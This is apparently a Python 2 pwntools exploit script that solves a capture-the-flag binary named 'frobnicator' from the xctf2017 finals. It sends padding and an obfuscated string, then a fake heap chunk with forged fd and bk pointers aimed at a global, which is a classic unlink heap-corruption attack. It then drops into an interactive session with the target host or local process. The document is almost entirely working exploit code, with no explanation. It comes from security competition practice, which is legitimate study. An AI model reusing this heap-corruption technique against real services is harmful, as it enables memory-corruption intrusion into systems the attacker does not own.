from pwn import *
import sys
import struct 

LOCAL = True

HOST = '192.168.0.31'
PORT = 10002

def send(s):
    r.sendline(s)
    data = r.recvuntil("string:")

SECOND_MALLOC = 0x006020b8

rekt = ""
rekt += chr(0xc4/2 + 0x2a)
rekt += chr(0xde/2 + 0x2a)
rekt += chr(0xea/2 + 0x2a)
rekt += chr(0xdc/2 + 0x2a)
rekt += chr(0xe8/2 + 0x2a)
rekt += chr(0xf2/2 + 0x2a)
rekt += chr(0x40/2 + 0x2a)
rekt += chr(0xd0/2 + 0x2a)

rekt += chr(0xea/2 + 0x2a)
rekt += chr(0xdc/2 + 0x2a)
rekt += chr(0xe8/2 + 0x2a)
rekt += chr(0xca/2 + 0x2a)
rekt += chr(0xe4/2 + 0x2a)
rekt += chr(0x42/2 + 0x2a)
rekt += chr(0x42/2 + 0x2a)
rekt += chr(0x00/2 + 0x2a)

def increment(x):
    newstr = ""
    for i in xrange(len(x)):
        newstr += chr((ord(x[i]) + 0x2a)& 0xFF)
    return newstr + 'A' * 8 + rekt # "\x2b" * (0x90 - len(newstr))

def exploit(r):

    #pad = 'A' * 0x2000
    pad = "\x2a" * 0x100
    send(pad)

    pad = "\x20\x36\x6a\x2a\x2a\x2a\x2a\x2a" * 18
    pad = p64(0x5454545454545454)  #0
    pad+= p64(0x5454545454545454)  #1
    pad+= p64(0x5454545454545454)  #2
    pad+= p64(0x6028d8)              #3
    send(increment(pad))

    pad = 'D' * 0x2
    send(pad)


    ## hAX b3L0w
    exploit =  p64(0x0)   # size
    exploit += p64(0x0)   # prev size
    exploit += p64(SECOND_MALLOC-0x18) # fd
    exploit += p64(SECOND_MALLOC-0x10) # bk

    exploit += '\x02' * (0x80 - len(exploit))

    exploit += p64(0x80) #THIRD_MALLOC prev_size
    exploit += p64(0xa0) #THIRD_MALLOC size

    send(increment(exploit))

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) == 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process('/home/rootkid/CTF_shits/xctf2017/finals/frobnicator/frobnicator')
        print util.proc.pidof(r)
        pause()
        exploit(r)
    

#python2 -c "print 'A' * 0x90; print '\xde' * (0x100 - 15 - 0x10) + '\xdd' * 8 + '\xde' * 7 + '\xdf' * 0x10; print ('\xdd' * 0x90 + '\n') * 2" > testcase
